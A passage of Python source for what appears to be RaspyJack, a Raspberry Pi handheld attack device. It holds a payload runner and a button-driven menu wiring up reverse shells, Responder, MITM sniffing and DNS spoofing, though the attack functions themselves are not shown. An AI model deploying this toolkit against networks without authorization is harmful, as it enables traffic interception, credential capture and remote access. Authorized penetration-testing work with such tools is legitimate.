    time.sleep(2)


def list_payloads():
    """
    Returns the list of .py scripts in payload_path, sorted by file name.
    """
    try:
        return sorted(
            f for f in os.listdir(default.payload_path)
            if f.endswith(".py") and not f.startswith("_")
        )
    except FileNotFoundError:
        os.makedirs(default.payload_path, exist_ok=True)
        return []

# ---------------------------------------------------------------------------
# 1)  Helper – reset GPIO *and* re-initialise the LCD
# ---------------------------------------------------------------------------
def _setup_gpio() -> None:
    """
    Bring every pin back to a known state **after** a payload
    (which most likely called ``GPIO.cleanup()`` on exit) and create a *fresh*
    LCD driver instance so that the display can be used again.
    """
    # --- GPIO -------------------------------------------------------------
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():                     # all buttons back to inputs
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    # --- LCD --------------------------------------------------------------
    global LCD, image, draw                      # replace the old objects
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (LCD.width, LCD.height), "BLACK")
    draw  = ImageDraw.Draw(image)


# ---------------------------------------------------------------------------
# 2)  exec_payload – run a script then *immediately* restore RaspyJack UI
# ---------------------------------------------------------------------------
def exec_payload(filename: str) -> None:
    """
    Execute a Python script located in « payloads/ » and *always*
    return control – screen **and** buttons – to RaspyJack.

    Workflow
    --------
    1. Freeze the UI (stop background threads, black screen).
    2. Run the payload **blocking** in the foreground.
    3. Whatever happens, re-initialise GPIO + LCD and redraw the menu.
    """
    full = os.path.join(default.payload_path, filename)
    if not os.path.isfile(full):
        print(f"[PAYLOAD] ✗ File not found: {full}")
        return                                       # nothing to launch

    print(f"[PAYLOAD] ► Starting: {filename}")
    screen_lock.set()                # stop _stats_loop & _display_loop
    LCD.LCD_Clear()                  # give the payload a clean canvas

    log = open(default.payload_log, "ab", buffering=0)
    try:
        subprocess.run(
            ["python3", full],
            cwd=default.install_path,  # same PYTHONPATH as RaspyJack
            stdout=log,
            stderr=subprocess.STDOUT,
        )
        print("[PAYLOAD]   • Finished without error.")
    except Exception as exc:
        print(f"[PAYLOAD]   • ERROR: {exc!r}")

    # ---- restore RaspyJack ----------------------------------------------
    print("[PAYLOAD] ◄ Restoring LCD & GPIO…")
    _setup_gpio()                                  # SPI/DC/RST/CS back

    # rebuild the current menu image
    color.DrawMenuBackground()
    color.DrawBorder()
    ShowLines(m.GetMenuList())                     # text + cursor
    LCD.LCD_ShowImage(image, 0, 0)                 # push *before* unlock

    # small debounce: 300 ms max
    t0 = time.time()
    while any(GPIO.input(p) == 0 for p in PINS.values()) and time.time() - t0 < .3:
        time.sleep(.03)

    screen_lock.clear()                            # threads can run again
    print("[PAYLOAD] ✔ Menu ready – you can navigate again.")


### Menu class ###
class DisposableMenu:
    which  = "a"     # Start menu
    select = 0       # Current selection index
    char   = "> "    # Indentation character
    max_len = 17     # Max chars per line

    menu = {
        "a": (
            [" Scan Nmap",      "ab"],     # b
            [" Reverse Shell",  "ac"],     # c
            [" Responder",      "ad"],     # d
            [" MITM & Sniff",   "ai"],     # i
            [" DNS Spoofing",   "aj"],     # j
            [" Network info",   ShowInfo], # appel direct
            [" Other features", "ag"],     # g
            [" Read file",      "ah"],     # h
            [" Payload", "ap"],            # p
        ),

        "ab": tuple(
            [f" {name}", partial(run_scan, name, args)]
            for name, args in SCANS.items()
        ),

        "ac": (
            [" Defaut Reverse",  defaut_Reverse],
            [" Remote Reverse",  remote_Reverse]
        ),

        "ad": (
            [" Responder ON",   responder_on],
            [" Responder OFF",  responder_off]
        ),
        "ag": (
            [" Browse Images", ImageExplorer],
            [" Options",       "ae"],   # e
            [" System",        "af"]    # f
        ),

        "ae": (
            [" Colors",         "aea"],
            [" Refresh config", LoadConfig],
            [" Save config!",   SaveConfig]
        ),

        "aea": (
            [" Background",          [SetColor, 0]],
            [" Text",                [SetColor, 2]],
            [" Selected text",       [SetColor, 3]],
            [" Selected background", [SetColor, 4]],
            [" Border",              [SetColor, 1]],
            [" Gamepad border",      [SetColor, 5]],
            [" Gamepad fill",        [SetColor, 6]]
        ),

        "af": (
            [" Shutdown system", [Leave, True]],
            [" Restart UI",      Restart]
        ),

        "ah": (
            [" Nmap",      ReadTextFileNmap],
            [" Responder", ReadTextFileResponder],
            [" DNSSpoof",  ReadTextFileDNSSpoof]
        ),

        "ai": (
            [" Start MITM & Sniff", Start_MITM],
            [" Stop MITM & Sniff",  Stop_MITM]
        ),

        "aj": (
            [" Start DNSSpoofing",  Start_DNSSpoofing],
            [" Select site",        "ak"],
            [" Stop DNS&PHP",       Stop_DNSSpoofing]
        ),

        "ak": tuple(
            [f" {site}", partial(spoof_site, site)]
            for site in SITES


        ),
    }

    # -----------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------
    def GetMenuList(self):
        """Return only the labels of the current menu."""
        return [item[0] for item in self.menu[self.which]]

    def GetMenuIndex(self, inlist):
        """Return the index of the selected label, or -1 if none."""
        x = GetMenuString(inlist)
        if x:
            for i, (label, _) in enumerate(self.menu[self.which]):
                if label == x:
                    return i
        return -1
    # Génération à chaud du sous-menu Payload -------------------------------
    def _build_payload_menu(self):
        """Crée (ou rafraîchit) le menu 'ap' en fonction du contenu du dossier."""
        self.menu["ap"] = tuple(
            [f" {script[:-3]}", partial(exec_payload, script)]
            for script in list_payloads()
        ) or ([" <vide>", lambda: None],)  # si aucun script n'est présent

    def __init__(self):
        # cette fois, `default` est déjà instancié → pas d’erreur
        self._build_payload_menu()


def main():
    # Draw background once
    color.DrawMenuBackground()
    color.DrawBorder()

    start_background_loops()

    print("Booted in %s seconds! :)" % (time.time() - start_time))

    # Menu handling
    # Running functions from menu structure
    while True:
        x = m.GetMenuIndex(m.GetMenuList())
        if x >= 0:
            m.select = x
            if isinstance(m.menu[m.which][m.select][1], str):
                m.which = m.menu[m.which][m.select][1]
            elif isinstance(m.menu[m.which][m.select][1], list):
                m.menu[m.which][m.select][1][0](
                    m.menu[m.which][m.select][1][1])
            else:
                m.menu[m.which][m.select][1]()
        elif len(m.which) > 1:
            m.which = m.which[:-1]


### Default values + LCD init ###
default = Defaults()

LCD = LCD_1in44.LCD()
Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT  # SCAN_DIR_DFT = D2U_L2R
LCD.LCD_Init(Lcd_ScanDir)
LCD_Config.Driver_Delay_ms(5)  # 8
#LCD.LCD_Clear()

image = Image.open(default.install_path + 'img/logo.bmp')
LCD.LCD_ShowImage(image, 0, 0)

image = Image.new("RGB", (LCD.width, LCD.height), "WHITE")
draw = ImageDraw.Draw(image)
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 8)

### Defining PINS, threads, loading JSON ###
PINS = {
    "KEY_UP_PIN": 6,
    "KEY_DOWN_PIN": 19,
    "KEY_LEFT_PIN": 5,
    "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13,
    "KEY1_PIN": 21,
    "KEY2_PIN": 20,
    "KEY3_PIN": 16
}
LoadConfig()
m = DisposableMenu()

### Info ###
print("I'm running on " + str(temp()).split('.')[0] + " °C.")
print(time.strftime("%H:%M:%S"))

# Delay for logo
time.sleep(2)




if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        Leave()
